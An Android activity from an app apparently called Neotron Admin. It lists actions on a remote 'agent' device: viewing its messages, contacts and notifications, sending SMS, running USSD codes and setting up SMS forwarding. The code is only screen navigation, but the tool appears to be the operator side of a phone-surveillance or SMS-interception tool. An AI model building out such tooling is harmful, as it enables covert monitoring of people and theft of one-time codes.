package com.pegalite.neotronadmin.ui;

import android.content.Intent;
import android.os.Bundle;

import com.pegalite.neotronadmin.databinding.ActivityViewDeviceBinding;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

public class ViewDeviceActivity extends PegaAppCompatActivity {

    ActivityViewDeviceBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityViewDeviceBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        String agentID = getIntent().getStringExtra("agentID");
        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.messages.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, MessagesActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.contacts.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, ContactsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.sendMessage.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, SendMessageActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.details.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, ViewDetailsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.runUssdCode.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, RunUSSDCodeActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.notifications.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, NotificationsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.addSMSForwarding.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, SmsForwardingActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });


    }
}